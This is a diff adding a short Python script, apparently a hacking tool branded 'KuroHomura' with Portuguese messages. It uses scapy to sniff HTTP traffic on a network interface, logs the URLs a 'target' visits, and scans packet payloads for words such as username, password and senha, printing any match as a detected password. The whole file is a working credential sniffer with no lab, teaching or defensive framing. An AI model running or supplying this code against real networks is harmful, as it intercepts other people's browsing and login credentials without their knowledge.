@@ -1,0 +1,29 @@
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    print(f"🌑 [KuroHomura] Sniffer Ativo na interface {interface}...")
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["username", "user", "login", "password", "pass", "senha", "usuario"]
+        for keyword in keywords:
+            if keyword in load.lower():
+                return load
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print(f"[*] Alvo visitando: {url}")
+        
+        login_info = get_login_info(packet)
+        if login_info:
+            print(f"\n\n🔥 [SENHA DETECTADA] 🔥\nDados: {login_info}\n\n")
+
+# Use 'eth0' ou 'wlan0' (verifique com ip a)
+sniff("eth0")
